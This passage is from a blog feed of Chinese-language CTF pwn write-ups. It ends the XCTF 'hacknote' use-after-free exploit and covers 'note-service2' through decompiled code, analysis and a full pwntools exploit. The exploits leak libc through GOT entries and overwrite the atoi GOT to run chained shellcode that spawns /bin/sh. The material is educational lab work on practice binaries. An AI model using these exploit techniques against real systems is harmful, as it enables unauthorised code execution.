function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Note size :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',51996)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc = ELF('libc_32.so.6')</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token string">'BBBB'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x0804862B</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'||sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然而最后add(8,p32(system_addr)+’||sh’)而不是add(8,p32(system_addr)+p32(bin_sh_addr))，我们回到self_puts函数和show函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span><span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> note_cont <span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>note_ptr<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//在add函数中第一个chunk的第一个字段就存放了self_puts函数的地址，</span>                                  <span class="token comment" spellcheck="true">//结合self_puts函数分析可知这里是利用函数指针进行函数调用</span><span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> __cdecl <span class="token function">self_puts</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//注意这个+4之后再整体解引用</span><span class="token punctuation">}</span></code></pre><p>第一次我们是self_puts放在chunk_data的第一字段，got放在第二字段这样会执行self_puts函数，而self_puts函数会对其传入的参数+4再解引用，就是第二字段，因此我们成功泄露地址<br>但第二次我们是将system真实地址放入第一字段，第二字段即参数是note_ptr[v1]而这里放的是第一个chunk_data,所以如果我们add(8,p32(system_addr)+p32(bin_sh_addr)) 对应就是  (*system_addr)(system_addr+bin_sh_addr)<br>这里放的是”||sh”====&gt;(*system_addr)(system_addr+”||sh”)这样||前面的地址system无法作为参数，就会采用后面的sh作为参数</p></li></ul><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x17</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">73</span> <span class="token number">68</span> 3a <span class="token number">20</span>  <span class="token number">31</span> 3a <span class="token number">20</span> <span class="token number">10</span>  <span class="token number">8d</span> d5 f7 3a  <span class="token number">20</span> 6e <span class="token number">6f</span> <span class="token number">74</span>  │sh<span class="token operator">:</span> │<span class="token number">1</span><span class="token operator">:</span> ·│···<span class="token operator">:</span>│ not│    <span class="token number">00000010</span>  <span class="token number">20</span> <span class="token number">66</span> <span class="token number">6f</span> <span class="token number">75</span>  6e <span class="token number">64</span> 0a                               │ fou│nd·│    <span class="token number">00000017</span>sh<span class="token operator">:</span> <span class="token number">1</span><span class="token operator">:</span> \x10��<span class="token operator">:</span> not found$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token operator">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><strong>堆利用对指针理解要求较高，所以一定要分析清楚数据结构，还有关键函数（显示信息，更改信息的函数等）对指针的使用</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-note-service2</title>
      <link href="/2020/09/11/xctf-challenge-note-service2/"/>
      <url>/2020/09/11/xctf-challenge-note-service2/</url>
      
        <content type="html"><![CDATA[<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec note<span class="token operator">-</span>service2<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/note-service2'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX disabled    PIE<span class="token operator">:</span>      PIE enabled    RWX<span class="token operator">:</span>      Has RWX segments开启 PIE CANARY RWX</code></pre><h2 id="IDA–关键代码"><a href="#IDA–关键代码" class="headerlink" title="IDA–关键代码"></a>IDA–关键代码</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_CA5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-8h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>  result <span class="token operator">=</span> dword_20209C<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_20209C <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>       <span class="token punctuation">{</span>    result <span class="token operator">=</span> dword_20209C<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_20209C <span class="token operator">&lt;=</span> <span class="token number">11</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v1 <span class="token operator">=</span> <span class="token function">sub_B91</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> <span class="token function">sub_B91</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v2 <span class="token operator">=</span> result<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> result <span class="token operator">&lt;=</span> <span class="token number">8</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        qword_2020A0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>qword_2020A0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"malloc error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">read_buf_n</span><span class="token punctuation">(</span>qword_2020A0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> dword_20209C<span class="token operator">++</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span>del<span class="token punctuation">:</span>    <span class="token keyword">void</span> <span class="token function">sub_DE7</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST0C_4</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_B91</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span>qword_2020A0<span class="token punctuation">[</span>v0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>read_buf_n<span class="token punctuation">:</span>    <span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_AC3</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-20h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+13h] [rbp-Dh]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">// a1==addr</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// a2==8</span>  <span class="token punctuation">{</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> v4 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v7<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li>在sub_CA5函数主要实现添加信息的功能，信息包括：index，size，content。其中index没有限制，size最大为8，content也有限制。<ul><li>通过程序自制的read_buf_n函数可知当size（a2）为最大值8，可以向buf（addr）中读入7个字节，并在最后添加截至符。</li></ul></li><li>程序将chunk的返回地址放入bss段中，构成bss段数组，数组的下标index没有限制</li><li>del函数部分实现对应chunk的free<br>一部分数据段：<pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202018</span> off_202018      dq offset free          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _free↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202020</span> off_202020      dq offset puts          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _puts↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202028</span> off_202028      dq offset __stack_chk_fail<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202028</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> ___stack_chk_fail↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202030</span> off_202030      dq offset printf        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _printf↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202038</span> off_202038      dq offset memset        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _memset↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202040</span> off_202040      dq offset read          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _read↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202048</span> off_202048      dq offset __libc_start_main<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202048</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> ___libc_start_main↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202050</span> off_202050      dq offset malloc        <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _malloc↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202058</span> off_202058      dq offset setvbuf       <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _setvbuf↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202060</span> off_202060      dq offset atoi          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _atoi↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202068</span> off_202068      dq offset exit          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _exit↑r<span class="token punctuation">.</span>got<span class="token punctuation">.</span>plt<span class="token operator">:</span><span class="token number">0000000000202068</span> _got_plt        ends<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0 <span class="token punctuation">;</span> _QWORD qword_2020A0<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0 qword_2020A0    dq 0Ch <span class="token function">dup</span><span class="token punctuation">(</span><span class="token operator">?</span><span class="token punctuation">)</span>           <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_BE0<span class="token operator">+</span><span class="token number">18</span>↑o<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0                                         <span class="token punctuation">;</span> add<span class="token operator">+</span><span class="token number">92</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0 _bss            ends<span class="token punctuation">.</span>bss<span class="token operator">:</span>00000000002020A0</code></pre></li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>题目没有开启NX那么代表堆栈可执行，应该是要向堆里面写入shellcode<ul><li>每个chunk只能读入7个字节，所以现成的shellcode不能用，但可以自己asm对应的system/execve汇编指令（就像构造rop链一样）</li></ul></li><li>因为bss段数组没有控制index范围，查询相关资料可知数组下标为负数就是对应buf[0]前面的元素，那我们就可以修改函数got表达到控制程序执行流<ul><li>上面的数据段可知bss数组与这些函数got表的距离很近，可以访问到</li></ul></li><li>我们的system/execve的代码分布在多个chunk中那么要在里面放入跳转指令：jmp short 偏移</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>shellcode：execv(rdi=”/bin/sh”,rsi=0,rdx=0),rax=0x3b</p><pre class=" language-java"><code class="language-java">xor rax<span class="token punctuation">,</span>raxxor rsi<span class="token punctuation">,</span>rsixor rdx<span class="token punctuation">,</span>rdxmov eax<span class="token punctuation">,</span><span class="token number">0x3b</span>syscall这里如果直接mov rax<span class="token punctuation">,</span><span class="token number">0x3b</span> 这将会占用<span class="token number">7</span>字节</code></pre><p>至于rdi要存放/bin/sh，我们可以使用atoi_got表来解决这个问题：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000BBD                 mov     rdi<span class="token punctuation">,</span> rax        <span class="token punctuation">;</span> nptr<span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000BC0                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0000000000000BC5                 call    _atoi这是执行atoi函数的代码</code></pre><p>我们如果输入choice时，输入/bin/sh那么rdi==/bin/sh然后call atoi就会转跳到atoi_got，又我们可以通过数组越界来控制其got表里面的内容，放入转跳指令，使程序流到chunk中 的shellcode。</p><p>因为每一个chunk只能输入7字节，所以才精心构造了上面的指令。xor指令占用3字节，mov指令占用5字节，剩下的空间来存放跳转。<br>这里跳转jmp short xxx的机器码是 EB xxx（占两个字节）   看了大佬的博客偏移量xxx = 目标地址-当前地址-2。</p><p>那我们将要malloc 5次（每个chunk都是0x20的总大小） ，其分布为：<br><img src="https://s1.ax1x.com/2020/09/11/wtYL4S.png" alt=""></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>>'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note-service2'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#帮atoi_got占着第一个chunk</span>add<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'xor rax,rax'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'xor rsi,rsi'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'xor rdx,rdx'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'mov eax,0x3b'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\xeb\x19'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'syscall'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x90\x90\x90\x90\x90'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#释放，再malloc那么atoi_got就会被放在第一个chunk</span>add<span class="token punctuation">(</span><span class="token string">'-8'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'\x90\x90\x90\x90\x90\xeb\x19'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#pause()</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token 